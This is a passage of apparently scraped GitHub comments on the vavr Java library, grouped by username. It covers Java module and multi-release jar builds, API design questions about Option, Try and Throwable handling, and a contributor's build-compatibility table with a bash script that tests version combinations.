understand if this is a convention vavr has taken for their javadocs, but this seems odd and confusing to me. It makes it appear that the method takes two parameters when there really is only one parameter. Where does this convention come from? When I look at the javadocs for java.util.List.add(E e), I don't see an additional javadoc line for the E type.. ",
    "lslah": "Hi Daniel,\nthank you for your response.\nI was sure there must have been some discussion about join/flatten but it didn't occur to me to search for flatten. Next time I'll check the scala names.\nThank you for vavr!. ",
    "SergejIsbrecht": "Would like to see Java8 supported as well. As already discussed on twitter, it could probably be accomplished with https://blog.gradle.org/mrjars . I could have a look into it.. @danieldietrich, will have a look at it after work today. Ok, I will look into the suggestion of melix to generate binaries for each java version: java8 / java9 / java10. Probably use target Java10, because Java9 is not supported anymore. It would be great if we could hide internal implementation for >= Java9 and use internal package for Java8. I will play around a little bit and will give you feedback on this issue.. ",
    "audunhalland": "Glad to be of help \ud83d\udc4d . The others looked ok, yes.\nEspecially for Stream, I think it's important to not have unneeded references, because I figure it is commonly used to process large amounts of data, like in my case. When I think about it, the leak observed here would lead to the entire source stream being unable to become garbage collected during an ongoing consumption, because of the memoized elements, and the first Stream node indirectly referencing all items after it.. ",
    "melix": "Hi @danieldietrich,\nIn this case I assume that what you want to produce is a real module (under Java 9+), and hope that your jar will not break clients using Java 8 (saying this because libraries that scan jars will fail on your module-info file if they think it's a class and that's one of the reasons mrjars aren't cool). If all you want to do is reserve a module name for the future, then the Automatic-Module-Name entry in the manifest file should be enough.\nSo, if you want to have 2 sets of things that end up in a jar, so really, really want to produce a mrjar, it's not really different from, for example, having generated sources, compiling them and packaging in the jar eventually. Here it will involve:\n\ncreating a source set for your Java 9 files (just module-info.java, here)\nconfigure the compilation for this source set\nbundling the result in the jar\n\nSo, first step, create a java9 source set:\nsourceSets {\n   java9 {\n      java {\n       srcDirs = ['src/main/java9']\n      }\n   }\n}\nNext, configure the Java compile tasks:\n```\ncompileJava {\n   sourceCompatibility = 8\n   targetCompatibility = 8\n}\ncompileJava9Java {\n   sourceCompatibility = 9\n   targetCompatibility = 9\n}\n```\nThen, package everything into the jar:\n```\njar {\n  into('META-INF/versions/9') {\n     from sourceSets.java9.output\n  }\nmanifest.attributes(\n     'Multi-Release': 'true'\n  )\n}\n```\nAnd that's all! The following build scan shows that when running the jar task, Gradle will automatically trigger the compilation of both source sets, and include the result where you want.. BTW if you want to do this on all modules of your project, I'd suggest you make this a buildSrc plugin, and apply it to all your subprojects.. Out of curiosity, why did you put the jar configuration in an afterEvaluate?. I see, it's an ordering problem. You have to define the moduleName before you first use it. One way to do this is to create a plugin that will define it, so you'd do:\napply plugin: 'java'\napply plugin: 'modularity' // yours\n. Yes, using buildSrc is a good practice. See https://docs.gradle.org/current/userguide/custom_plugins.html for more ideas.. ",
    "jniedzwiecki": "@valery1707 thanks for such a comprehensive example of use!\nAs mentioned in my original question - I expected my issue could be caused by the stream elements being remembered and I was looking for a way to make stream forget the elements once used (as Java streams do).\nAFAIK it would be beneficial if the documentation contained such example use of the Iterator. I was not able to find this information on my own easily (though it's of course possible that I was not searching correctly ;) ).\nThanks again for support!. ",
    "splitcells": "Only the message of a thrown exception is printed and the stack trace is omitted.. From my point of view, it would be best (if possible) to even print the input variables of the Predicate\nthat cause the error as it might not be clear which input caused the faulty behaviour.. ",
    "jarekratajski": "Thank you for the answer. Understood.  Not a problem at all. \ngetOrElseGet works for me.\nand indeed such specific \"sugar\" operations can be added per project to not pollute vavr api,\n(in that case maybe I will use kotlin extension functions)\n. ",
    "rajneeshg0": "I do not want to open the option when it is not empty just throw exception when it is empty. Especially useful when you have built the chain using flatmap. If I use Option.getOrElseThrow(Supplier), it will open the option and I will have to close again if I want to return Option from a function. Think it as\nOption.OrElseThrow(Supplier) ~ Option.of(Option.getOrElseThrow(Supplier))\n. use case when I would want to do do that is when I call flatmap with a funtion, that returns a Option, but does not throw exception on null\nsomething like .flatmap( a -> f1(a).orElseThrow(new RuntimeException() ))\ninstead of \n .flatmap( a -> Option.of(f1(a).getorElseThrow(new RuntimeException() )))\nf1(a) is returning a option. Map does the implicit wrapping. I wanted avoid that as well. Second option will kind of work, butit will be good to have supplier instead of runnable.. ",
    "garlicsauce": "Thanks @nfekete! Now this works fine.. ",
    "enolive": "I'd suggest filterOrElse as the name of this new functionality to be conform with the implementation in Scala and other languages that were inspired by it. See also \nhttps://www.scala-lang.org/api/current/scala/util/Either.html#filterOrElseA1%3E:A:scala.util.Either[A1,B]. ",
    "agrison": "I have the exact same need, I can see that this has been implemented even in 0.9.x but I can't find it in the official 0.9.2 release which appears to have not been updated since Nov 2017.\nIs there any release planned for the 0.9.x branch which includes these improvements ? I'm stuck with Java 8 and can't move to Java 11 at work for the moment and I'd really need this feature to remove some ugly code :smiley: . ",
    "chantrybjss": "In this case, I have actually reverted to using Optional in my code.\nMy main concern is that the map method allows Option to create a Some with a null value, which I had  assumed would be impossible. \nI have looked closer at the source and it appears map is not unique in this respect. I had assumed some() was a private scoped method, but it is actually possible to create Some objects of null type (seemingly by design). \nIt is my opinion that it should not be possible to create null valued Some objects. However, I do not want to get into a debate about API design, so unless there is some other reason, I think it is safe to close this issue. . ",
    "kennymacleod": "CheckReturnValue doesn't need to be brought in from another library.\nErrorProne and IntelliJ will recognise the annotation name irrespective of\nwhich package it's in, so you can define it in your own project without\nadding any dependencies.\nTake, for example, the one in the rxjava2 codebase.\nOn Wed., 25 Jul. 2018, 19:37 Daniel Dietrich, notifications@github.com\nwrote:\n\nThanks for the suggestion.\nCheckReturnValue isn't part of native Java. We do not add any 3rd party\ndependencies to our library (even if they are seen as some kind of\npseudo-standard).\nSo I have to close this issue.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/issues/2261#issuecomment-407695586, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AFz1fLFbk3k6AEaVeoQCvG58AOvjPA0zks5uKDw6gaJpZM4VMOpd\n.\n. \n",
    "sclassen": "Will this be backported for people stuck on vavr 0.9 ??\n. ",
    "EliasJorgensen": "I will make an actual example as soon as i have time.. ",
    "yarulan": "Hi @danieldietrich, thanks for the explanation. I'm sorry, but I don't understand your reasoning. I don't see how removing functionality can help your users to achieve their goals. That change will change single line of code\njava\nTry.withResources(() -> DriverManager.getConnection(\"\")).run(conn -> System.out.println(\"Ok\"));\ninto 5 lines\njava\nTry.run(() -> {\n    try (var conn = DriverManager.getConnection(\"\")) {\n        System.out.println(\"Ok\");\n    }\n});\nP.S.\nI have another proposition: remove collections from vavr. You will be able to\n remove N types Travelsable, Seq, LinearSeq, IndexedSeq, Queue, Stream, List, Array, Vector...\n remove NM methods from classes above\n use native Java collections where possible, instead of introducing redundant proprietary API\nP.P.S.\nLibraries' purpose is to make life easier for the users, not for the authors.. @danieldietrich thanks for the response and sorry for being rude.\nOn performance: that's true that there are few class instantiations. But if they are performance bottleneck of your application then I can only congratulate you. Resources are usually some IO, that's milliseconds comparing to nanoseconds on instantiations.\nOn lines of code: that depends on formatting, but I agree that the difference is insignificant. Oh... I just realized, the difference is really insignificant. Emmm... Shame on me. Sorry for wasting your time.. ",
    "chefhoobajoob": "Facepalm - doh! Thank you for the clarification and the forum ref - I'll join up on Gitter.. ",
    "jorgepelizzoni": "Thanks for your prompt reply, Daniel! What I really found surprising was the behaviour of lastbecause it is based on max. Also, for TreeMap, min is based on the custom comparator, so you can actually get the same result for min and max depending on your setup. Anyway, I am able to work around the issue in my code and will be looking forward to 1.0.. ",
    "superbmilkyway": "@SimY4 @danieldietrich Thank you so much ;). ",
    "tlinkowski": "Hi, I haven't read the entire conversation in detail, but I've noticed the discussion about the generalization of the transform method from\njava\n<R> R transform(Function<? super Vector<T>, ? extends R> f)\n<R> R transform(Function<? super Map<K, V>, ? extends R> f)\ninto\njava\n<R> R transform(Function<? super *SELF*, ? extends R> f)\n@nfekete said:\n\nyou cannot express this without HKT's I think.\n\nand it's true that you can't currently express a single method like that in Java.\n\nHowever, I've come up with a workaround for this. It doesn't use higher-kinded types, and instead uses a helper object with a covariant return type (two method calls):\n```java\ninterface Value {\n  Transformer<? extends Value> transformed();\n}\ninterface Traversable extends Value {\n  @Override\n  Transformer<? extends Traversable> transformed();\n}\nwhere:java\n@FunctionalInterface\ninterface Transformer {\n   R by(Function<? super T, ? extends R> f);\n}\n```\nUsage:\njava\nString string = value.transfomed().by(Object::toString);\nIf you find it interesting, see my blog post for more details: Transformer Pattern.\nHope it helps! :smiley:. Sorry to butt in, but here's what SO says about it: Is \u201cthrows Throwable\u201d good practice :wink:. Thanks for such a detailed explanation, Daniel!\nIf I understand it right, the only reason you need throws Throwable is because your users have some code that declares throws Throwable.\nAFAIK, they don't really need to declare throws Throwable, because by declaring throws Exception they could still throw exactly the same exceptions. I actually wonder why throws Throwable is legal in Java (as opposed to throws Exception, Error).\nBut as soon as these users do declare throws Throwable, you indeed need throws Throwable too in order not to make their life harder.\nIf they didn't declare throws Throwable, you could have only throws Exception in your interfaces, but still catch all Throwables:\n```java\nTry wrap(CheckedFunction0 in) {\n  try {\n    return Try.success(in.apply());\n  } catch (Throwable t) {\n    return Try.failure(t);\n  }\n}\ninterface CheckedFunction0 {\n  R apply() throws Exception;\n}\n```\nPS. Beside the point, but I admit I still have trouble accepting that consumers should handle all Throwables. E.g. wrapping OutOfMemoryError in a Try seems like not such a good idea to me.\n\nJust one related funny example:\n```java\ninterface Base {\n  int get() throws Throwable;\n}\ninterface Super extends Base {\n  @Override\n  int get() throws Exception;\n}\npublic static void main(String[] args) {\n  Base b = null;\n  try {\n    b.get(); // Unhandled exception: Throwable\n  } catch (Exception e) {\n    e.printStackTrace();\n  }\nSuper s = null;\n  try {\n    s.get(); // OK\n  } catch (Exception e) {\n    e.printStackTrace();\n  }\n}\n```\nSo javac:\n- lets you override a method from throws Throwable to throws Exception\n- doesn't let you catch Exception only when there's throws Throwable. @danieldietrich, thank you again for your detailed explanation!\nFirst of all, I apologize for my too quick (and actually stupid) example:\n1. It had wrong names (Super should be Sub).\n2. It claimed to prove inconsistency in javac, but it didn't, because the overridden int get() throws Exception simply narrowed down the thrown exception range from Throwable to Exception (covariance).\n3. As you pointed out, I should've actually considered consuming a throwing lambda instead of handling a thrown exception directly.\nSecondly, you're absolutely right: I haven't considered a custom subclass of Throwable. And it wasn't even about it probably being a wrong practice - I actually missed that fact that you can do that! \ud83d\ude1b\nIn light of this, I'm definitely convinced that vavr's Try should handle such a case. So thank you again for explaining this! \ud83d\udc4d \nBTW. Of course, you're right that for an \"average\" user of Try (one throwing Exceptions only), it makes no difference if CheckedConsumer declares to throw Exception or Throwable. For them, the functionality of Try remains the same.\n\nFinally, my only concern remains with catching Errors. I'd hate to waste any more of your time, but perhaps you could just give me a hint of why it's better to catch them in a Try than propagate them?\nI mean: isn't it too risky, in general? E.g. catching ExceptionInInitializerError will lead to NoClassDefFoundError when trying to access the same class again, and the latter may be confusing for the users.\nIn other words, I wonder why it's better to implement Try.of as:\njava\ntry {\n  return new Success<>(supplier.apply());\n} catch (Throwable t) {\n  return new Failure<>(t);\n}\ninstead of:\njava\ntry {\n  return new Success<>(supplier.apply());\n} catch (Error e) {\n  throw e;\n} catch (Throwable t) {\n  return new Failure<>(t);\n}\nThe same applies to Try.run.. @nfekete Thank you, that explains it!\nI admit I didn't think to check the constructor of Failure, because I didn't expect any logic there.\nPerhaps there's a very good reason to have it that way (e.g. making sure this constraint is always enforced), but let me just mention an alternative design (just in case you haven't considered it):\n```java\npublic static  Try of(CheckedSupplier<? extends T> supplier) {\n  // ...\n  try {\n    return success(supplier.get());\n  } catch (Throwable t) {\n    return failure(t);\n  }\n}\npublic static  Try failure(Throwable exception) {\n  if (cause instanceof LinkageError || cause instanceof ThreadDeath || cause instanceof VirtualMachineError) { \n     throw (Error) cause; \n  } \n  return new Failure<>(exception); // only call to the constructor & no check inside\n}\n```. ",
    "marknorkin": "Hello, @danieldietrich \nI would like to give another point of view which is based on the poll provided by @nfekete.\nI agree that most of developers currently use Java 8 and if vavr would require Java 9 this would also decrease the amount of potential users.\nI would propose to take a look into Spring Framework JIRA ticket on automatic module names and approach they decided to go with.\nIf the vavr codebase stays on Java 8, this could be the option to be available for Java 9+ users on module path and in future gradually move vavr to Java 9 when most of the projects will migrate on it.. ",
    "1304julian": "I have a problem, I clone the project, and I import like a gradle project, and dont compile, I use intellij and Mac OS\nThanks . ",
    "jbrains": "I wanted to help, but I might be missing something: Multimap already has a method called asMap(), which appears to do what I'd expect. I found only one test, which turns Multimap { 1 => 2, 1 => 3 } into Map { 1 => [2, 3] }. This at least suggests exactly the same thing as @skestle seems to expect.\nWere you look for something else, @skestle?. I'm trying various combinations. I'm running Pop!_OS 18.04, which is effectively Ubuntu 18.04.. Well, I found a combination that works.\n\nJava 9.0.7-zulu\nMaven 3.6.0\nscala-maven-plugin: 3.4.4\n\nI'll try a few more combinations, just in case you find the information helpful.. Here is what I've learned, summarized:\n\nBuild fails with Java 10\nBuild succeeds with Java 9\nexcept it fails with Maven 3.5.3 and scala-maven-plugin 3.4.2\n\n\nBuild fails with Java 8\n\nHere is the blow-by-blow:\nb1076f84 Build FAILED with Java 10.0.2-zulu, Maven 3.6.0, scala-maven-plugin 3.4.4.\n4db91bde Build FAILED with Java 10.0.2-zulu, Maven 3.6.0, scala-maven-plugin 3.4.2.\n8a86c565 Build FAILED with Java 10.0.2-zulu, Maven 3.6.0, scala-maven-plugin 3.4.1.\n28080e77 Build FAILED with Java 10.0.2-zulu, Maven 3.5.4, scala-maven-plugin 3.4.4.\n5cd9b628 Build FAILED with Java 10.0.2-zulu, Maven 3.5.4, scala-maven-plugin 3.4.2.\n9471266b Build FAILED with Java 10.0.2-zulu, Maven 3.5.4, scala-maven-plugin 3.4.1.\n20c59721 Build FAILED with Java 10.0.2-zulu, Maven 3.5.3, scala-maven-plugin 3.4.4.\n96ad251b Build FAILED with Java 10.0.2-zulu, Maven 3.5.3, scala-maven-plugin 3.4.2.\ncadd4226 Build FAILED with Java 10.0.2-zulu, Maven 3.5.3, scala-maven-plugin 3.4.1.\n53db2929 Build FAILED with Java 10.0.2-open, Maven 3.6.0, scala-maven-plugin 3.4.4.\n84f49881 Build FAILED with Java 10.0.2-open, Maven 3.6.0, scala-maven-plugin 3.4.2.\n6a25413c Build FAILED with Java 10.0.2-open, Maven 3.6.0, scala-maven-plugin 3.4.1.\n1ac47b47 Build FAILED with Java 10.0.2-open, Maven 3.5.4, scala-maven-plugin 3.4.4.\n7d0137ee Build FAILED with Java 10.0.2-open, Maven 3.5.4, scala-maven-plugin 3.4.2.\n67d97991 Build FAILED with Java 10.0.2-open, Maven 3.5.4, scala-maven-plugin 3.4.1.\nc19ac546 Build FAILED with Java 10.0.2-open, Maven 3.5.3, scala-maven-plugin 3.4.4.\nba76cb2a Build FAILED with Java 10.0.2-open, Maven 3.5.3, scala-maven-plugin 3.4.2.\n2e80ade4 Build FAILED with Java 10.0.2-open, Maven 3.5.3, scala-maven-plugin 3.4.1.\n96c07b55 Build FAILED with Java 10.0.1-zulu, Maven 3.6.0, scala-maven-plugin 3.4.4.\n2819bc2e Build FAILED with Java 10.0.1-zulu, Maven 3.6.0, scala-maven-plugin 3.4.2.\n5f7515b6 Build FAILED with Java 10.0.1-zulu, Maven 3.6.0, scala-maven-plugin 3.4.1.\n7eca5f62 Build FAILED with Java 10.0.1-zulu, Maven 3.5.4, scala-maven-plugin 3.4.4.\n837b4513 Build FAILED with Java 10.0.1-zulu, Maven 3.5.4, scala-maven-plugin 3.4.2.\n63e563c5 Build FAILED with Java 10.0.1-zulu, Maven 3.5.4, scala-maven-plugin 3.4.1.\n2abe51bf Build FAILED with Java 10.0.1-zulu, Maven 3.5.3, scala-maven-plugin 3.4.4.\n3a3b36fc Build FAILED with Java 10.0.1-zulu, Maven 3.5.3, scala-maven-plugin 3.4.2.\n932a7597 Build FAILED with Java 10.0.1-zulu, Maven 3.5.3, scala-maven-plugin 3.4.1.\n47dff975 Build SUCCESS with Java 9.0.7-zulu, Maven 3.6.0, scala-maven-plugin 3.4.4.\n166e8e76 Build SUCCESS with Java 9.0.7-zulu, Maven 3.6.0, scala-maven-plugin 3.4.2.\n521831d6 Build SUCCESS with Java 9.0.7-zulu, Maven 3.6.0, scala-maven-plugin 3.4.1.\n15c10399 Build SUCCESS with Java 9.0.7-zulu, Maven 3.5.4, scala-maven-plugin 3.4.4.\n3ddf5719 Build SUCCESS with Java 9.0.7-zulu, Maven 3.5.4, scala-maven-plugin 3.4.2.\n86e739ee Build SUCCESS with Java 9.0.7-zulu, Maven 3.5.4, scala-maven-plugin 3.4.1.\nba7194a1 Build SUCCESS with Java 9.0.7-zulu, Maven 3.5.3, scala-maven-plugin 3.4.4.\n7210cd58 Build FAILED with Java 9.0.7-zulu, Maven 3.5.3, scala-maven-plugin 3.4.2.\n8493da51 Build SUCCESS with Java 9.0.7-zulu, Maven 3.5.3, scala-maven-plugin 3.4.1.\n60bfcc0c Build SUCCESS with Java 9.0.4-open, Maven 3.6.0, scala-maven-plugin 3.4.4.\n5cafbd3b Build SUCCESS with Java 9.0.4-open, Maven 3.6.0, scala-maven-plugin 3.4.2.\n16983193 Build SUCCESS with Java 9.0.4-open, Maven 3.6.0, scala-maven-plugin 3.4.1.\n990794eb Build SUCCESS with Java 9.0.4-open, Maven 3.5.4, scala-maven-plugin 3.4.4.\nf8865b13 Build SUCCESS with Java 9.0.4-open, Maven 3.5.4, scala-maven-plugin 3.4.2.\nd422682e Build SUCCESS with Java 9.0.4-open, Maven 3.5.4, scala-maven-plugin 3.4.1.\n9a8a2bcd Build SUCCESS with Java 9.0.4-open, Maven 3.5.3, scala-maven-plugin 3.4.4.\n9fc461b2 Build FAILED with Java 9.0.4-open, Maven 3.5.3, scala-maven-plugin 3.4.2.\n419512c7 Build SUCCESS with Java 9.0.4-open, Maven 3.5.3, scala-maven-plugin 3.4.1.\n733a3c01 Build FAILED with Java 8.0.191-oracle, Maven 3.6.0, scala-maven-plugin 3.4.4.\nffd04c25 Build FAILED with Java 8.0.191-oracle, Maven 3.6.0, scala-maven-plugin 3.4.2.\nc4117358 Build FAILED with Java 8.0.191-oracle, Maven 3.6.0, scala-maven-plugin 3.4.1.\ne0da2daf Build FAILED with Java 8.0.191-oracle, Maven 3.5.4, scala-maven-plugin 3.4.4.\n5604c0c4 Build FAILED with Java 8.0.191-oracle, Maven 3.5.4, scala-maven-plugin 3.4.2.\nf0d5ad96 Build FAILED with Java 8.0.191-oracle, Maven 3.5.4, scala-maven-plugin 3.4.1.\n0daec671 Build FAILED with Java 8.0.191-oracle, Maven 3.5.3, scala-maven-plugin 3.4.4.\n0b277893 Build FAILED with Java 8.0.191-oracle, Maven 3.5.3, scala-maven-plugin 3.4.2.\n625936f8 Build FAILED with Java 8.0.191-oracle, Maven 3.5.3, scala-maven-plugin 3.4.1.\n7aabd629 Build FAILED with Java 8.0.181-zulu, Maven 3.6.0, scala-maven-plugin 3.4.4.\n73bcddfb Build FAILED with Java 8.0.181-zulu, Maven 3.6.0, scala-maven-plugin 3.4.2.\nacdcf386 Build FAILED with Java 8.0.181-zulu, Maven 3.6.0, scala-maven-plugin 3.4.1.\n004a74be Build FAILED with Java 8.0.181-zulu, Maven 3.5.4, scala-maven-plugin 3.4.4.\n9adbcd75 Build FAILED with Java 8.0.181-zulu, Maven 3.5.4, scala-maven-plugin 3.4.2.\nc1b894b0 Build FAILED with Java 8.0.181-zulu, Maven 3.5.4, scala-maven-plugin 3.4.1.\naf66ed71 Build FAILED with Java 8.0.181-zulu, Maven 3.5.3, scala-maven-plugin 3.4.4.\n75c5d951 Build FAILED with Java 8.0.181-zulu, Maven 3.5.3, scala-maven-plugin 3.4.2.\n5c4b16eb Build FAILED with Java 8.0.181-zulu, Maven 3.5.3, scala-maven-plugin 3.4.1.. You're welcome. I'll try to contribute something to the documentation. . Dear prospective contributor, if you have problems building Vavr, then you might need to experiment with different combinations of versions of Java, Maven, and the Scala plugin for Maven. This issue contains a summary of test results from one new contributor trying to find combinations that build on Pop!_OS 18.04 (Linux 4.15.0-34-generic #37-Ubuntu SMP x86_64) as of the date of writing these words.\nI used sdkman to try various versions of Java and Maven. I changed the file pom.xml in the root of the project to try various versions of the Scala plugin for Maven. Look for the build property named scala.maven.version. See https://github.com/vavr-io/vavr/pull/2270 for an example of changing the version of the Scala plugin for Maven, specifically the change at https://github.com/vavr-io/vavr/pull/2270/commits/7c897aa92a2ae609157d61400649a6719e806048.\nRunning Tests\nI wrote a script test a bunch of combinations. It commits once per combination to the Vavr project repository with a description of the test result. Put this script in your PATH somewhere, then run it. If you haven't installed all the various versions of Java and Maven before, then you'll need to either set sdkman_auto_answer to false (don't make each installed version the default) or answer a question at the prompt every few minutes. As of today, sdkman doesn't let me specify \"auto answer\" without changing my user-level sdkman configuration.\nYou can open the script and change the lists of Java, Maven, and Scala plugin versions, if you'd like to test different versions. I chose all of Java 8, 9, and 10 as well as Maven 3.5.3+ and Scala plugin 3.4.1+, because those seemed to be likely candidates to work as of today and from what I could glean from project documents and issues.\nI called this script build-vavr.sh.\n```bash\n!/usr/bin/env bash\nfunction build_vavr() {\n  local sdkman_root=\"$1\"\n  local vavr_project_root=\"$2\"\n  local java_version=\"$3\"\n  local maven_version=\"$4\"\n  local scala_maven_version=\"$5\"\nsource \"${sdkman_root}/bin/sdkman-init.sh\"\n  sdk use java \"${java_version}\"\n  sdk use maven \"${maven_version}\"\n  sed -i \"s/.+<\\/scala.maven.version>/${scala_maven_version}<\\/scala.maven.version>/\" ${vavr_project_root}/pom.xml\n  pushd \"${vavr_project_root}\"\n  mvn clean test -e\n  # REFACTOR Remove the obvious duplication here. I haven't yet learned how to do that in bash.\n  if [ $? -eq 0 ]\n  then\n    git add -A\n    git commit --allow-empty -m \"Build SUCCESS with Java ${java_version}, Maven ${maven_version}, scala-maven-plugin ${scala_maven_version}.\"\n  else\n    git add -A\n    git commit --allow-empty -m \"Build FAILED with Java ${java_version}, Maven ${maven_version}, scala-maven-plugin ${scala_maven_version}.\"\n  fi\n  popd\n}\nfunction run_tests() {\n  # REFACTOR Extract these lists to make them parameters or environment variables. I haven't yet learned how to do that in bash.\n  for java_version in \"8.0.181-zulu\" \"8.0.191-oracle\" \"9.0.4-open\" \"9.0.7-zulu\" \"10.0.1-zulu\" \"10.0.2-open\" \"10.0.2-zulu\"\n  do\n    for maven_version in \"3.5.3\" \"3.5.4\" \"3.6.0\"\n    do\n      for scala_maven_version in \"3.4.1\" \"3.4.2\" \"3.4.4\"\n      do\n        build_vavr \"${SDKMAN_DIR}\" \"${VAVR_PROJECT_ROOT}\" \"$java_version\" \"$maven_version\" \"$scala_maven_version\"\n      done\n    done\n  done\n}\n[[ -z \"${SDKMAN_DIR}\" ]] && { \n  echo \"Environment variable SDKMAN_DIR is not set,\"\n  echo \"so I can't run these tests.\"\n  echo \"Install sdkman and/or set SDKMAN_DIR to your user's\"\n  echo \"sdkman folder, which is probably \\$HOME/.sdkman\"\n  exit 1\n}\n[[ -z \"$1\" ]] && {\n  echo \"Usage: build-vavr.sh VAVR_PROJECT_ROOT\"\n  echo \"    Example: build-vavr.sh ~/Workspaces/vavr\"\n  echo \"\"\n  echo \"Prerequisites\"\n  echo \"-------------\"\n  echo \"\"\n  echo \"You need sdkman and the environment variable\"\n  echo \"SDKMAN_DIR must be set to the location of\"\n  echo \"your user's sdkman folder, which is probably \\$HOME/.sdkman.\"\n  echo \"Visit https://sdkman.io to install sdkman.\"\n  echo\n  echo \"You need git available on the system PATH.\"\n  echo \"Visit https://git-scm.com to install git.\"\n  exit 1\n}\ngit --version || {\n  echo \"Unable to run git. Please install git and check\"\n  echo \"that git is on your PATH.\"\n  exit 1\n}\nVAVR_PROJECT_ROOT=\"$1\"\npushd \"${VAVR_PROJECT_ROOT}\"\n[[ -z \"$(git status -s)\" ]] || {\n  echo \"You have uncommitted changes in your working copy\"\n  echo \"of the vavr project. This script commits to its own\"\n  echo \"git branch in order to report results. Please stash,\"\n  echo \"reset, or commit your changes, then run this\"\n  echo \"script again.\"\n  exit 1\n}\ngrep -q returns 0 on match and non-0 on no match\ngit branch | grep -q \"find-settings-that-will-build-vavr\" && {\n  echo \"What are the odds?! You already have a git branch\"\n  echo \"called 'find-settings-that-will-build-vavr'?! Please\"\n  echo \"rename it or delete it. Sorry.\"\n  exit 1\n}\ngit checkout -b find-settings-that-will-build-vavr\nrun_tests\ngit log --pretty=oneline find-settings-that-will-build-vavr\npopd\n``. The first commit involves bumping the version of the Scala plugin for Maven. I'd obviously clean that up in the final pull request.. I'll hammer it into shape, then, and put it where it seems to make sense to go. Thanks. . Ugh. I'd forgot to clean some things up. I'm rechecking now.. I now submit this pull request \"for real\". I accept your feedback. Thank you.. I understand. I didn't intend Monoid to go in that direction, but rather to provide a convenience for expressingsum()asfold()` that \"better\" (purely my opinion) expresses intent. When I looked for a name for the thing that combines an identity element and an \"add\" function, I realized that it should be \"Monoid\", even though I really wanted to avoid the arguably misleading formalism. Your reaction confirms my suspicion.\nI see it the other way: a method like sum(Monoid) might help would-be functional programmers in Java learn about fold/reduce without being forced to use arcane-sounding words to describe a familiar concept. Perhaps it works better for sum() to be a literal alias for foldLeft().\nOn the one hand, I would have preferred to know this before I invested energy into doing it. That is why I asked for feedback before going too far. On the other hand, should I have the urge to try to contribute to this code base in the future, I now know how to do it.. Thanks for explaining. I think I understand. No worries.. ",
    "galegofer": "Hi Daniel,\nThanks for the quick answer, and sorry for the late response.\nAbout a CheckedConsumerN, I think what you said about getting rid of them at VAVR 1.0.x is a good idea. \nAnyway, I think given VAVR 0.9.x is quite popular, and those interfaces are handy, why not to provide  something to give more cohesion rather than to be in need to create an artificial interface just for a special case, I mean compare a code like:\n```\nprivate final CheckedFunction2 dummy = (t, u) -> {\n     mycode... Throws exception\n return null;\n\n}\n```\nwith:\nprivate final CheckedConsumer2<T, U> dummy = (t, u) -> {\n     mycode ...   \n}\nI think that to return null, just to don't have an interface makes the code less readable and given we have these kinds of interfaces at VAVR 0.9.x, why no to add another one (n indeed) that's will help us to make the code more concise?.\nAnother question that is arising in my head, what's going to happen with VAVR 0.9.x branch, I mean, given VAVR 1.0.x is not going to be backward compatible with 0.9.x, does it means that 0.9.x maintenance will finish? or 0.9.x will have eventually a release to a major version (not just to 0.10.x)?\nMaybe a VAVR 1.0.x should be the name for the line of 0.9.x and VAVR 1.0.x should go to 2.0.X? just my 20 cents.\n. I didn't know about Java with primitive generics, that's amazing, so it makes sense what you said.\nThanks!. ",
    "smoyer64": "I wish I'd noticed that before! ... It works perfectly for the String processing I'm trying to do.  I'm really just getting started with Vavr so I guess I should expect a bit of that.. Nice!. ",
    "yvolk": "@danieldietrich Thank you for update. Very strange restriction...\nAs a workaround, you could try this: fork your own repository and make vavr 1.0 be in a master branch of that repository. And release from that repository?!\n...Anyway, we are not in a hurry :-)\nHappy New Year!. Thank you, @danieldietrich \nI was able to use the new artifact, but it appeared that its artifactId changed since alpha-1\nThe new artifactId is \"vavr\", not \"vavr-control\" as previously. Please correct README.md. ",
    "HiDAl": "I asked it on stackoverflow: https://stackoverflow.com/questions/54113639/how-to-properly-implement-this-using-vavr\n:) . ",
    "svenefftinge": "Hi Daniel, \ud83d\udc4b \nlooks like Java 9 is required. Maybe you should put that into the readme as well?\nIt can be fixed in Gitpod by using a different Docker image. I'll look into it.. ",
    "PHaroZ": "Since I discovered your library 9 months ago my way of doing things completly changed. So thanks for your great job and thanks for this update.\n. ",
    "2m": "I noticed that this error does not occur with older Scala versions, like 2.12.4. Therefore I should better report this to Scala issue tracker.. Yes, same error with 2.13.0-M5. Looks like 2.12.4 is the last version that works. . Yes, coursier is quite neat. :) I am using fish as my shell, therefore the difference of the shells scripts. . Thank you for getting to the bottom of this!\nOn Sat, 19 Jan 2019, 04:45 Daniel Dietrich <notifications@github.com wrote:\n\nClosed #2337 https://github.com/vavr-io/vavr/issues/2337.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub\nhttps://github.com/vavr-io/vavr/issues/2337#event-2084335409, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AAZwxgSoqOKxNkesh2Noaeg3FVUJfl9lks5vEpTSgaJpZM4Z8j3q\n.\n. \n",
    "artus": "Of course, the answer is so obvious and I did not think my question through. Thank you!. ",
    "castillobgr": "Hi @danieldietrich ! Thanks for your kind response and explanation.\nI totally understand and support making Vavr as light as possible (hence my curiosity about whether you'd seen other people use something similar).\nRegarding your question, this wouldn't compile with my implementation of FutureEither\njava\nFutureEither.of(() -> HTTP.GET(\"/resource\"));\nThat's because like Cat's EitherT[Future, L, R], FutureEither is internally a Future<Either<L, R>>.\nSo to construct it you'd need a Future<Either<L, R>>, or, via \"convenience\" functions, just an Either:\njava\nFutureEither<String, Potato> a = FutureEither.of(Future.successful(Either.left(\"Whoops\")));\n// or\nFutureEither<String, Potato> b = FutureEither.fromEither(Either.right(new Potato()));\n// or, like in my examples above\nFutureEither<String, Potato> c = FutureEither.left(\"Hello\")\nFutureEither's purpose, in our case, is to make it easier to model async domain functions, moving away from exceptions in favor of domain errors.\nI hope that explains it well!\nBtw, if you can point me in the right direction (docs, bugs, etc), I'd love to contribute and keep Vavr going strong!. ",
